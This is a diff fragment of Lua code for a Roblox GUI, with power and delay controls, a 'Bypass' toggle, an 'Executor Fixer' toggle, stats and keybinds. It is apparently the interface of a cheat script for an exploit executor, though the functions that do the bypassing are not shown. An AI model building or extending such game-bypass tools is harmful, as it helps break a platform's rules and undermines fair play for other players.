+PcBtn.TextColor3 = Color3.fromRGB(180, 180, 190)
+PcBtn.Font = Enum.Font.GothamBold
+PcBtn.TextSize = 10
+PcBtn.ZIndex = 11
+PcBtn.Parent = PowerPill
+Instance.new("UICorner", PcBtn).CornerRadius = UDim.new(1, 0)
+
+local MobileBtn = Instance.new("TextButton")
+MobileBtn.Size = UDim2.new(0, 46, 0, 22)
+MobileBtn.Position = UDim2.new(0, 174, 0.5, -11)
+MobileBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 85)
+MobileBtn.Text = "Mobile"
+MobileBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MobileBtn.Font = Enum.Font.GothamBold
+MobileBtn.TextSize = 10
+MobileBtn.ZIndex = 11
+MobileBtn.Parent = PowerPill
+Instance.new("UICorner", MobileBtn).CornerRadius = UDim.new(1, 0)
+
+local ExecPill = makePill(74, V2Container)
+local ExecGrad = Instance.new("UIGradient")
+ExecGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 200)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 180, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 200))
+})
+ExecGrad.Transparency = NumberSequence.new(1)
+ExecGrad.Parent = ExecPill
+
+local ExecLabel = makeLabel(ExecPill, "Executor Fixer: OFF", 12, 160)
+local ExecTogglePill, ExecToggleDot = makeToggle(ExecPill)
+
+local StatsPill = makePill(110, V2Container)
+local StatsLabel = makeLabel(StatsPill, "FPS: --   Ping: -- ms   TPB: 0", 12, 240)
+StatsLabel.Font = Enum.Font.Gotham
+StatsLabel.TextSize = 9
+
+local function updatePower()
+    PowerDisplay.Text = tostring(State.power[State.mode])
+    V1PowerDisplay.Text = tostring(State.power[State.mode])
+end
+
+local function setMode(mode)
+    State.mode = mode
+    TweenService:Create(PcBtn, TweenInfo.new(0.12), {
+        BackgroundColor3 = mode == "PC" and Color3.fromRGB(70, 70, 85) or Color3.fromRGB(25, 25, 30),
+        TextColor3 = mode == "PC" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 190)
+    }):Play()
+    TweenService:Create(MobileBtn, TweenInfo.new(0.12), {
+        BackgroundColor3 = mode == "Mobile" and Color3.fromRGB(70, 70, 85) or Color3.fromRGB(25, 25, 30),
+        TextColor3 = mode == "Mobile" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 190)
+    }):Play()
+    updatePower()
+end
+
+MinusBtn.MouseButton1Click:Connect(function()
+    local maxP = State.mode == "PC" and CONFIG.MAX_POWER or 100000
+    State.power[State.mode] = math.clamp(State.power[State.mode] - CONFIG.STEP, CONFIG.MIN_POWER, maxP)
+    updatePower()
+    if State.running and State.activeVersion == "V2" then stopExecution() startExecution() end
+end)
+
+PlusBtn.MouseButton1Click:Connect(function()
+    local maxP = State.mode == "PC" and CONFIG.MAX_POWER or 100000
+    State.power[State.mode] = math.clamp(State.power[State.mode] + CONFIG.STEP, CONFIG.MIN_POWER, maxP)
+    updatePower()
+    if State.running and State.activeVersion == "V2" then stopExecution() startExecution() end
+end)
+
+V1MinusBtn.MouseButton1Click:Connect(function()
+    local maxP = State.mode == "PC" and CONFIG.MAX_POWER or 100000
+    State.power[State.mode] = math.clamp(State.power[State.mode] - CONFIG.STEP, CONFIG.MIN_POWER, maxP)
+    updatePower()
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+V1PlusBtn.MouseButton1Click:Connect(function()
+    local maxP = State.mode == "PC" and CONFIG.MAX_POWER or 100000
+    State.power[State.mode] = math.clamp(State.power[State.mode] + CONFIG.STEP, CONFIG.MIN_POWER, maxP)
+    updatePower()
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+V1PowerDisplay.FocusLost:Connect(function()
+    local num = tonumber(V1PowerDisplay.Text)
+    if num then
+        State.power[State.mode] = math.clamp(math.floor(num), CONFIG.MIN_POWER, CONFIG.MAX_POWER)
+    end
+    updatePower()
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+V1DelayMinus.MouseButton1Click:Connect(function()
+    State.v1Delay = math.clamp(State.v1Delay - 0.01, CONFIG.MIN_DELAY, CONFIG.MAX_DELAY)
+    V1DelayDisplay.Text = string.format("%.3f", State.v1Delay)
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+V1DelayPlus.MouseButton1Click:Connect(function()
+    State.v1Delay = math.clamp(State.v1Delay + 0.01, CONFIG.MIN_DELAY, CONFIG.MAX_DELAY)
+    V1DelayDisplay.Text = string.format("%.3f", State.v1Delay)
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+V1DelayDisplay.FocusLost:Connect(function()
+    local num = tonumber(V1DelayDisplay.Text)
+    if num then
+        State.v1Delay = math.clamp(num, CONFIG.MIN_DELAY, CONFIG.MAX_DELAY)
+        V1DelayDisplay.Text = string.format("%.3f", State.v1Delay)
+    else
+        V1DelayDisplay.Text = string.format("%.3f", State.v1Delay)
+    end
+    if State.running and State.activeVersion == "V1" then stopExecution() startExecution() end
+end)
+
+PcBtn.MouseButton1Click:Connect(function() setMode("PC") end)
+MobileBtn.MouseButton1Click:Connect(function() setMode("Mobile") end)
+
+local function setBypass(on)
+    State.bypassEnabled = on
+    State.running = on
+    if on then
+        BypassLabel.Text = "Bypass: ON"
+        V1BypassLabel.Text = "Bypass: ON"
+
+        TweenService:Create(ToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(1, -14, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(100, 255, 130)
+        }):Play()
+        TweenService:Create(TogglePill, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(40, 80, 50)}):Play()
+
+        TweenService:Create(V1ToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(1, -14, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(100, 255, 130)
+        }):Play()
+        TweenService:Create(V1TogglePill, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(40, 80, 50)}):Play()
+        
+        startExecution()
+    else
+        BypassLabel.Text = "Bypass: OFF"
+        V1BypassLabel.Text = "Bypass: OFF"
+
+        TweenService:Create(ToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(0, 2, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+        }):Play()
+        TweenService:Create(TogglePill, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
+
+        TweenService:Create(V1ToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(0, 2, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+        }):Play()
+        TweenService:Create(V1TogglePill, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(25, 25, 30)}):Play()
+        
+        stopExecution()
+    end
+end
+
+TogglePill.MouseButton1Click:Connect(function() setBypass(not State.bypassEnabled) end)
+V1TogglePill.MouseButton1Click:Connect(function() setBypass(not State.bypassEnabled) end)
+
+local execGradAnim = nil
+
+local function setExecutorFixer(on)
+    if on then
+        ExecLabel.Text = "Executor Fixer: ON"
+        TweenService:Create(ExecToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(1, -14, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(180, 80, 255)
+        }):Play()
+        TweenService:Create(ExecTogglePill, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(60, 20, 90)
+        }):Play()
+        ExecGrad.Transparency = NumberSequence.new(0.6)
+        if execGradAnim then task.cancel(execGradAnim) end
+        execGradAnim = task.spawn(function()
+            local t = 0
+            while State.executorFixer do
+                t = t + 0.05
+                ExecGrad.Offset = Vector2.new(math.sin(t) * 0.8, 0)
+                task.wait(0.03)
+            end
+        end)
+        ExecutorFixer.start()
+    else
+        ExecLabel.Text = "Executor Fixer: OFF"
+        TweenService:Create(ExecToggleDot, TweenInfo.new(0.18), {
+            Position = UDim2.new(0, 2, 0.5, -6),
+            BackgroundColor3 = Color3.fromRGB(180, 180, 180)
+        }):Play()
+        TweenService:Create(ExecTogglePill, TweenInfo.new(0.18), {
+            BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+        }):Play()
+        ExecGrad.Transparency = NumberSequence.new(1)
+        if execGradAnim then pcall(task.cancel, execGradAnim) execGradAnim = nil end
+        ExecutorFixer.stop()
+    end
+end
+
+ExecTogglePill.MouseButton1Click:Connect(function()
+    setExecutorFixer(not State.executorFixer)
+end)
+
+V1Btn.MouseButton1Click:Connect(function()
+    State.activeVersion = "V1"
+    V1Container.Visible = isOpen
+    V2Container.Visible = false
+    V1Btn.BackgroundColor3 = Color3.fromRGB(70, 70, 85)
+    V1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    V2Btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    V2Btn.TextColor3 = Color3.fromRGB(180, 180, 190)
+end)
+
+V2Btn.MouseButton1Click:Connect(function()
+    State.activeVersion = "V2"
+    V1Container.Visible = false
+    V2Container.Visible = isOpen
+    V2Btn.BackgroundColor3 = Color3.fromRGB(70, 70, 85)
+    V2Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    V1Btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    V1Btn.TextColor3 = Color3.fromRGB(180, 180, 190)
+end)
+
+local listeningKeybind = false
+local listeningV1Keybind = false
+
+KeybindBtn.MouseButton1Click:Connect(function()
+    listeningKeybind = true
+    KeybindBtn.Text = "[...]"
+    KeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 80)
+end)
+
+V1KeybindBtn.MouseButton1Click:Connect(function()
+    listeningV1Keybind = true
+    V1KeybindBtn.Text = "[...]"
+    V1KeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 80)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    if listeningKeybind and input.UserInputType == Enum.UserInputType.Keyboard then
+        State.keybind = input.KeyCode
+        KeybindBtn.Text = "[" .. input.KeyCode.Name .. "]"
+        KeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+        V1KeybindBtn.Text = "[" .. input.KeyCode.Name .. "]"
+        listeningKeybind = false
+        return
+    end
+    if listeningV1Keybind and input.UserInputType == Enum.UserInputType.Keyboard then
+        State.keybind = input.KeyCode
+        V1KeybindBtn.Text = "[" .. input.KeyCode.Name .. "]"
+        V1KeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
+        KeybindBtn.Text = "[" .. input.KeyCode.Name .. "]"
+        listeningV1Keybind = false
+        return
+    end
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == State.keybind then
+        setBypass(not State.bypassEnabled)
+    end
+end)
+
+setMode(State.mode)
+setBypass(false)
